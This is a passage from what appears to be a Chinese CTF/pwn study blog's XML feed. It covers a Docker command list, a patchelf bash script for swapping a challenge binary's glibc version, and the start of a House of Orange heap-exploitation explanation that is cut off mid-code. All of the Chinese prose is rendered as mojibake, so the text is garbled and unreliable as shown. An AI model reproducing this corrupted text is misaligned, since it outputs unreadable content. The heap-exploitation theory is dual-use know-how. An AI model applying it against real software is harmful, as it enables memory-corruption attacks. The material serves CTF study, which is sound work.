class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://192.168.15.236:7890&quot;</span><br>  &#125;<br>&#125;<br><span class="hljs-meta">#æ›´æ¢ä¸ºè‡ªå·±çš„ipå’Œç«¯å£</span><br></code></pre></td></tr></table></figure><h2 id="dockerä½¿ç”¨ç®€å•å‘½ä»¤"><a href="#dockerä½¿ç”¨ç®€å•å‘½ä»¤" class="headerlink" title="dockerä½¿ç”¨ç®€å•å‘½ä»¤"></a>dockerä½¿ç”¨ç®€å•å‘½ä»¤</h2><h3 id="å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†"><a href="#å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†" class="headerlink" title="å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†"></a>å®¹å™¨ç”Ÿå‘½å‘¨æœŸç®¡ç†</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">run - åˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨ã€‚<br>start/stop/restart - è¿™äº›å‘½ä»¤ä¸»è¦ç”¨äºå¯åŠ¨ã€åœæ­¢å’Œé‡å¯å®¹å™¨ã€‚<br><span class="hljs-built_in">kill</span> - ç«‹å³ç»ˆæ­¢ä¸€ä¸ªæˆ–å¤šä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨<br><span class="hljs-built_in">rm</span> - äºåˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªå·²ç»åœæ­¢çš„å®¹å™¨ã€‚<br>pause/unpause - æš‚åœå’Œæ¢å¤å®¹å™¨ä¸­çš„æ‰€æœ‰è¿›ç¨‹ã€‚<br>create - åˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œä½†ä¸ä¼šå¯åŠ¨å®ƒã€‚<br><span class="hljs-built_in">exec</span> - åœ¨è¿è¡Œä¸­çš„å®¹å™¨å†…æ‰§è¡Œä¸€ä¸ªæ–°çš„å‘½ä»¤ã€‚<br>rename - é‡å‘½åå®¹å™¨ã€‚<br></code></pre></td></tr></table></figure><h3 id="å®¹å™¨æ“ä½œ"><a href="#å®¹å™¨æ“ä½œ" class="headerlink" title="å®¹å™¨æ“ä½œ"></a>å®¹å™¨æ“ä½œ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps - åˆ—å‡º Docker å®¹å™¨<br>inspect - è·å– Docker å¯¹è±¡ï¼ˆå®¹å™¨ã€é•œåƒã€å·ã€ç½‘ç»œç­‰ï¼‰çš„è¯¦ç»†ä¿¡æ¯ã€‚<br>top - æ˜¾ç¤ºæŒ‡å®šå®¹å™¨ä¸­çš„æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚<br>attach - å…è®¸ç”¨æˆ·é™„åŠ åˆ°æ­£åœ¨è¿è¡Œçš„å®¹å™¨å¹¶ä¸å…¶äº¤äº’ã€‚<br>events - è·å– Docker å®ˆæŠ¤è¿›ç¨‹ç”Ÿæˆçš„äº‹ä»¶ã€‚<br>logs - è·å–å’ŒæŸ¥çœ‹å®¹å™¨çš„æ—¥å¿—è¾“å‡ºã€‚<br><span class="hljs-built_in">wait</span> - å…è®¸ç”¨æˆ·ç­‰å¾…å®¹å™¨åœæ­¢å¹¶è·å–å…¶é€€å‡ºä»£ç ã€‚<br><span class="hljs-built_in">export</span> - å°†å®¹å™¨çš„æ–‡ä»¶ç³»ç»Ÿå¯¼å‡ºä¸º tar å½’æ¡£æ–‡ä»¶ã€‚<br>port - æ˜¾ç¤ºå®¹å™¨çš„ç«¯å£æ˜ å°„ä¿¡æ¯ã€‚<br>stats - å®æ—¶æ˜¾ç¤º Docker å®¹å™¨çš„èµ„æºä½¿ç”¨æƒ…å†µã€‚<br>å®¹å™¨çš„rootæ–‡ä»¶ç³»ç»Ÿï¼ˆrootfsï¼‰å‘½ä»¤<br>commit - å…è®¸ç”¨æˆ·å°†å®¹å™¨çš„å½“å‰çŠ¶æ€ä¿å­˜ä¸ºæ–°çš„ Docker é•œåƒã€‚<br><span class="hljs-built_in">cp</span> - ç”¨äºåœ¨å®¹å™¨å’Œå®¿ä¸»æœºä¹‹é—´å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•ã€‚<br>diff - æ˜¾ç¤º Docker å®¹å™¨æ–‡ä»¶ç³»ç»Ÿçš„å˜æ›´ã€‚<br></code></pre></td></tr></table></figure><h3 id="é•œåƒä»“åº“"><a href="#é•œåƒä»“åº“" class="headerlink" title="é•œåƒä»“åº“"></a>é•œåƒä»“åº“</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">login</span>/logout - ç®¡ç† Docker å®¢æˆ·ç«¯ä¸ Docker æ³¨å†Œè¡¨çš„èº«ä»½éªŒè¯ã€‚<br>pull - ä» Docker æ³¨å†Œè¡¨ï¼ˆä¾‹å¦‚ Docker Hubï¼‰ä¸­æ‹‰å–ï¼ˆä¸‹è½½ï¼‰é•œåƒåˆ°æœ¬åœ°ã€‚<br>push - å°†æœ¬åœ°æ„å»ºçš„ Docker é•œåƒæ¨é€ï¼ˆä¸Šä¼ ï¼‰åˆ° Docker æ³¨å†Œè¡¨ï¼ˆå¦‚ Docker Hub æˆ–ç§æœ‰æ³¨å†Œè¡¨ï¼‰ã€‚<br><span class="hljs-keyword">search</span> - ç”¨äºåœ¨ Docker Hub æˆ–å…¶ä»–æ³¨å†Œè¡¨ä¸­æœç´¢é•œåƒã€‚<br></code></pre></td></tr></table></figure><h3 id="æœ¬åœ°é•œåƒç®¡ç†"><a href="#æœ¬åœ°é•œåƒç®¡ç†" class="headerlink" title="æœ¬åœ°é•œåƒç®¡ç†"></a>æœ¬åœ°é•œåƒç®¡ç†</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">images - åˆ—å‡ºæœ¬åœ°çš„ Docker é•œåƒã€‚<br>rmi - åˆ é™¤ä¸å†éœ€è¦çš„é•œåƒã€‚<br>tag - åˆ›å»ºæœ¬åœ°é•œåƒçš„åˆ«åï¼ˆtagï¼‰ã€‚<br>build - ä» Dockerfile æ„å»º Docker é•œåƒã€‚<br>history - æŸ¥çœ‹æŒ‡å®šé•œåƒçš„å†å²å±‚ä¿¡æ¯ã€‚<br>save - å°†ä¸€ä¸ªæˆ–å¤šä¸ª Docker é•œåƒä¿å­˜åˆ°ä¸€ä¸ª tar å½’æ¡£æ–‡ä»¶ä¸­ã€‚<br><span class="hljs-keyword">load</span> - ä»ç”± docker save å‘½ä»¤ç”Ÿæˆçš„ tar æ–‡ä»¶ä¸­åŠ è½½ Docker é•œåƒã€‚<br><span class="hljs-keyword">import</span> - ä»ä¸€ä¸ª tar æ–‡ä»¶æˆ– URL å¯¼å…¥å®¹å™¨å¿«ç…§ï¼Œä»è€Œåˆ›å»ºä¸€ä¸ªæ–°çš„ Docker é•œåƒã€‚<br><span class="hljs-keyword">info</span>|<span class="hljs-keyword">version</span><br><span class="hljs-keyword">info</span> - æ˜¾ç¤º Docker çš„ç³»ç»Ÿçº§ä¿¡æ¯ï¼ŒåŒ…æ‹¬å½“å‰çš„é•œåƒå’Œå®¹å™¨æ•°é‡ã€‚<br><span class="hljs-keyword">version</span> - æ˜¾ç¤º Docker å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚<br>Docker Compose<br>docker compose run - å¯åŠ¨ä¸€ä¸ªæ–°å®¹å™¨å¹¶è¿è¡Œä¸€ä¸ªç‰¹å®šçš„åº”ç”¨ç¨‹åºã€‚<br>docker compose rm - å¯åŠ¨ä¸€ä¸ªæ–°å®¹å™¨å¹¶åˆ é™¤ä¸€ä¸ªç‰¹å®šçš„åº”ç”¨ç¨‹åºã€‚<br>docker compose ps - ä» docker compose æ£€æŸ¥ docker å®¹å™¨çŠ¶æ€ã€‚<br>docker compose build - æ„å»º docker compose æ–‡ä»¶ã€‚<br>docker compose up - è¿è¡Œ docker compose æ–‡ä»¶ã€‚<br>docker compose ls - åˆ—å‡º docker compose æœåŠ¡ã€‚<br>docker compose <span class="hljs-keyword">start</span> - å¯åŠ¨ docker compose æ–‡ä»¶åˆ›å»ºçš„å®¹å™¨ã€‚<br>docker compose <span class="hljs-keyword">restart</span> - é‡å¯ docker compose æ–‡ä»¶åˆ›å»ºçš„å®¹å™¨ã€‚<br></code></pre></td></tr></table></figure><h3 id="ç½‘ç»œå‘½ä»¤"><a href="#ç½‘ç»œå‘½ä»¤" class="headerlink" title="ç½‘ç»œå‘½ä»¤"></a>ç½‘ç»œå‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs \">docker network ls: åˆ—å‡ºæ‰€æœ‰ç½‘ç»œã€‚<br>docker network create &lt;network&gt;: åˆ›å»ºä¸€ä¸ªæ–°çš„ç½‘ç»œã€‚<br>docker network rm &lt;network&gt;: åˆ é™¤æŒ‡å®šçš„ç½‘ç»œã€‚<br>docker network connect &lt;network&gt; &lt;container&gt;: è¿æ¥å®¹å™¨åˆ°ç½‘ç»œã€‚<br>docker network disconnect &lt;network&gt; &lt;container&gt;: æ–­å¼€å®¹å™¨ä¸ç½‘ç»œçš„è¿æ¥ã€‚<br>è¯¦ç»†å†…å®¹æŸ¥çœ‹ï¼šdocker network å‘½ä»¤<br></code></pre></td></tr></table></figure><h3 id="å·å‘½ä»¤"><a href="#å·å‘½ä»¤" class="headerlink" title="å·å‘½ä»¤"></a>å·å‘½ä»¤</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">docker <span class="hljs-built_in">volume</span> ls: åˆ—å‡ºæ‰€æœ‰å·ã€‚<br>docker <span class="hljs-built_in">volume</span> <span class="hljs-keyword">create</span> &lt;<span class="hljs-built_in">volume</span>&gt;: åˆ›å»ºä¸€ä¸ªæ–°çš„å·ã€‚<br>docker <span class="hljs-built_in">volume</span> rm &lt;<span class="hljs-built_in">volume</span>&gt;: åˆ é™¤æŒ‡å®šçš„å·ã€‚<br>docker <span class="hljs-built_in">volume</span> inspect &lt;<span class="hljs-built_in">volume</span>&gt;: æ˜¾ç¤ºå·çš„è¯¦ç»†ä¿¡æ¯ã€‚<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ‚è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ›´æ¢libcä¸æ»‘å°è¿æ‹›</title>
    <link href="/2024/09/28/%E6%9B%B4%E6%8D%A2libc%E4%B8%9D%E6%BB%91%E5%B0%8F%E8%BF%9E%E6%8B%9B/"/>
    <url>/2024/09/28/%E6%9B%B4%E6%8D%A2libc%E4%B8%9D%E6%BB%91%E5%B0%8F%E8%BF%9E%E6%8B%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="æ›´æ¢libcä¸æ»‘å°è¿æ‹›"><a href="#æ›´æ¢libcä¸æ»‘å°è¿æ‹›" class="headerlink" title="æ›´æ¢libcä¸æ»‘å°è¿æ‹›"></a>æ›´æ¢libcä¸æ»‘å°è¿æ‹›</h2><p>ä¸»è¦å‚è€ƒå¤§ä½¬çš„ä¸€ç¯‡æ–‡ç« </p><p><a href="https://blog.csdn.net/j284886202/article/details/142406824?spm=1001.2014.3001.5502">â˜…pwn æ›´æ”¹pwné¢˜libcä¿å§†çº§æ•™ç¨‹â˜…</a></p><p>ä¸»è¦è®°å½•ä¸€ä¸‹clibcçš„è„šæœ¬</p><p>å¤§ä½¬ç»™çš„è„šæœ¬ä¸æ˜¯å¾ˆç¬¦åˆè‡ªå·±çš„ä¹ æƒ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>FILE_NAME=<span class="hljs-variable">$1</span><br>LIBC_VERSION=<span class="hljs-variable">$2</span><br>WORKDIR=$(<span class="hljs-built_in">pwd</span>)<br><br><span class="hljs-comment"># åˆ¤æ–­ ELF æ–‡ä»¶ä½æ•°</span><br>EBIT=$(file <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span> | <span class="hljs-built_in">cut</span> -c 1-2)<br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$EBIT</span>&quot;</span> -eq <span class="hljs-string">&quot;32&quot;</span> ]; <span class="hljs-keyword">then</span><br>    LIBC_DIR=/usr/lib/freelibs/i386<br><span class="hljs-keyword">elif</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$EBIT</span>&quot;</span> -eq <span class="hljs-string">&quot;64&quot;</span> ]; <span class="hljs-keyword">then</span><br>    LIBC_DIR=/usr/lib/freelibs/amd64<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;It&#x27;s not an ELF file.&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># æŸ¥æ‰¾ libc æ–‡ä»¶</span><br>libc_dir=$(find <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_DIR</span>&quot;</span> -name <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION</span>*&quot;</span>)<br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not supported version or your <span class="hljs-variable">$LIBC_DIR</span> doesn&#x27;t have libc.&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># æå–ç‰ˆæœ¬å·</span><br>LIBC_VERSION_CLEAN=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;-&#x27;</span> -f 1)<br>LIBC_VERSION_MAJOR=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_CLEAN</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;.&#x27;</span> -f 1)<br>LIBC_VERSION_MINOR=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_CLEAN</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;.&#x27;</span> -f 2)<br><br><span class="hljs-comment"># ç»„åˆçŸ­ç‰ˆæœ¬å·</span><br>LIBC_VERSION_SHORT=<span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>.<span class="hljs-variable">$LIBC_VERSION_MINOR</span>&quot;</span><br><br><span class="hljs-comment"># å¤„ç†åŠ¨æ€é“¾æ¥åº“</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>&quot;</span> -gt 2 || \<br>          (<span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>&quot;</span> -eq 2 &amp;&amp; <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MINOR</span>&quot;</span> -gt 33) ]]; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$EBIT</span>&quot;</span> -eq <span class="hljs-string">&quot;32&quot;</span> ]; <span class="hljs-keyword">then</span><br>            patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-linux.so.2&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$WORKDIR</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>        <span class="hljs-keyword">else</span><br>            patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-linux-x86-64.so.2&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$WORKDIR</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">else</span><br>        patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-<span class="hljs-variable">$LIBC_VERSION_SHORT</span>.so&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>&quot;</span> -gt 2 || \<br>          (<span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>&quot;</span> -eq 2 &amp;&amp; <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MINOR</span>&quot;</span> -gt 33) ]]; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$EBIT</span>&quot;</span> -eq <span class="hljs-string">&quot;32&quot;</span> ]; <span class="hljs-keyword">then</span><br>            patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-linux.so.2&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>        <span class="hljs-keyword">else</span><br>            patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-linux-x86-64.so.2&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">else</span><br>        patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-<span class="hljs-variable">$LIBC_VERSION_SHORT</span>.so&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;success!!!&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨æ•™ç¨‹"><a href="#ä½¿ç”¨æ•™ç¨‹" class="headerlink" title="ä½¿ç”¨æ•™ç¨‹"></a>ä½¿ç”¨æ•™ç¨‹</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">clibc xxx &lt;å®Œæ•´ç‰ˆæœ¬å·&gt;<br><span class="hljs-attr">#clibc ret 2</span><span class="hljs-number">.27</span><span class="hljs-number">-3</span>ubu<span class="hljs-symbol">ntu1</span><span class="hljs-number">.6</span>_amd<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ä¸æ»‘åˆ‡æ¢ä»»ä½•å°ç‰ˆæœ¬äº†</p><h2 id="å…³äºä¸‹è½½glibc-all-in-oneä¸­æ²¡æœ‰çš„å°ç‰ˆæœ¬"><a href="#å…³äºä¸‹è½½glibc-all-in-oneä¸­æ²¡æœ‰çš„å°ç‰ˆæœ¬" class="headerlink" title="å…³äºä¸‹è½½glibc-all-in-oneä¸­æ²¡æœ‰çš„å°ç‰ˆæœ¬"></a>å…³äºä¸‹è½½glibc-all-in-oneä¸­æ²¡æœ‰çš„å°ç‰ˆæœ¬</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://launchpad.net/ubuntu/+<span class="hljs-built_in">source</span>/glibc/&lt;libcç‰ˆæœ¬&gt; <span class="hljs-comment">##ä¾‹å¦‚2.31-0ubuntu9.9</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥ç½‘ç«™åç‚¹å‡»æƒ³è¦çš„ç‰ˆæœ¬</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411201605562.png" alt="image-20241120160500490"></p><p>åœ¨Builtä¸­ä¸‹è½½ç›¸åº”çš„æ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411201606672.png" alt="image-20241120160606618"></p><p>ç„¶åæ‹–è¿›glibc-all-in-oneä¸­çš„debs</p><p>æ‰§è¡Œå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./extract debs/libc6_2.31-0ubuntu9.9_i386.deb libs/2.31-0ubuntu9.9_i386<br>./extract debs/libc6-dbg_2.31-0ubuntu9.9_i386.deb libs/2.31-0ubuntu9.9_i386/.debug<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ‚è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ›´æ¢libc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Orange</title>
    <link href="/2024/09/12/House-of-Orange/"/>
    <url>/2024/09/12/House-of-Orange/</url>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>House of Orange çš„åˆ©ç”¨æ¯”è¾ƒç‰¹æ®Šï¼Œé¦–å…ˆéœ€è¦ç›®æ ‡æ¼æ´æ˜¯å †ä¸Šçš„æ¼æ´ä½†æ˜¯ç‰¹æ®Šä¹‹å¤„åœ¨äºé¢˜ç›®ä¸­ä¸å­˜åœ¨ free å‡½æ•°æˆ–å…¶ä»–é‡Šæ”¾å †å—çš„å‡½æ•°ã€‚æˆ‘ä»¬çŸ¥é“ä¸€èˆ¬æƒ³è¦åˆ©ç”¨å †æ¼æ´ï¼Œéœ€è¦å¯¹å †å—è¿›è¡Œ malloc å’Œ free æ“ä½œï¼Œä½†æ˜¯åœ¨ House of Orange åˆ©ç”¨ä¸­<strong>æ— æ³•ä½¿ç”¨ free å‡½æ•°</strong>ï¼Œå› æ­¤ House of Orange æ ¸å¿ƒå°±æ˜¯é€šè¿‡æ¼æ´åˆ©ç”¨è·å¾— free çš„æ•ˆæœã€‚</p><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>å¦‚æˆ‘ä»¬å‰é¢æ‰€è¿°ï¼ŒHouse of Orange çš„æ ¸å¿ƒåœ¨äºåœ¨æ²¡æœ‰ free å‡½æ•°çš„æƒ…å†µä¸‹å¾—åˆ°ä¸€ä¸ªé‡Šæ”¾çš„å †å— (unsorted bin)ã€‚ è¿™ç§æ“ä½œçš„åŸç†ç®€å•æ¥è¯´æ˜¯å½“å‰å †çš„ top chunk å°ºå¯¸ä¸è¶³ä»¥æ»¡è¶³ç”³è¯·åˆ†é…çš„å¤§å°çš„æ—¶å€™ï¼ŒåŸæ¥çš„ top chunk ä¼šè¢«é‡Šæ”¾å¹¶è¢«ç½®å…¥ unsorted bin ä¸­ï¼Œé€šè¿‡è¿™ä¸€ç‚¹å¯ä»¥åœ¨æ²¡æœ‰ free å‡½æ•°æƒ…å†µä¸‹è·å–åˆ° unsorted binsã€‚</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹çš„è¯¦ç»†æƒ…å†µï¼Œæˆ‘ä»¬å‡è®¾ç›®å‰çš„ top chunk å·²ç»ä¸æ»¡è¶³ malloc çš„åˆ†é…éœ€æ±‚ã€‚ é¦–å…ˆæˆ‘ä»¬åœ¨ç¨‹åºä¸­çš„<code>malloc</code>è°ƒç”¨ä¼šæ‰§è¡Œåˆ° libc.so çš„<code>_int_malloc</code>å‡½æ•°ä¸­ï¼Œåœ¨<code>_int_malloc</code>å‡½æ•°ä¸­ï¼Œä¼šä¾æ¬¡æ£€éªŒ fastbinã€small binsã€unsorted binã€large bins æ˜¯å¦å¯ä»¥æ»¡è¶³åˆ†é…è¦æ±‚ï¼Œå› ä¸ºå°ºå¯¸é—®é¢˜è¿™äº›éƒ½ä¸ç¬¦åˆã€‚æ¥ä¸‹æ¥<code>_int_malloc</code>å‡½æ•°ä¼šè¯•å›¾ä½¿ç”¨ top chunkï¼Œåœ¨è¿™é‡Œ top chunk ä¹Ÿä¸èƒ½æ»¡è¶³åˆ†é…çš„è¦æ±‚ï¼Œå› æ­¤ä¼šæ‰§è¡Œå¦‚ä¸‹åˆ†æ”¯ã€‚</p><p>ç»¼ä¸Šï¼Œæˆ‘ä»¬è¦å®ç° brk æ‹“å±• top chunkï¼Œä½†æ˜¯è¦å®ç°è¿™ä¸ªç›®çš„éœ€è¦ç»•è¿‡ä¸€äº› libc ä¸­çš„ checkã€‚ é¦–å…ˆï¼Œmalloc çš„å°ºå¯¸ä¸èƒ½å¤§äº<code>mmp_.mmap_threshold</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))<br></code></pre></td></tr></table></figure><p>å¦‚æœæ‰€éœ€åˆ†é…çš„ chunk å¤§å°å¤§äº mmap åˆ†é…é˜ˆå€¼ï¼Œé»˜è®¤ä¸º 128Kï¼Œå¹¶ä¸”å½“å‰è¿›ç¨‹ä½¿ç”¨ mmap() åˆ†é…çš„å†…å­˜å—å°äºè®¾å®šçš„æœ€å¤§å€¼ï¼Œå°†ä½¿ç”¨ mmap() ç³»ç»Ÿè°ƒç”¨ç›´æ¥å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ã€‚</p><p>åœ¨ sysmalloc å‡½æ•°ä¸­å­˜åœ¨å¯¹ top chunk size çš„ checkï¼Œå¦‚ä¸‹</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">assert((<span 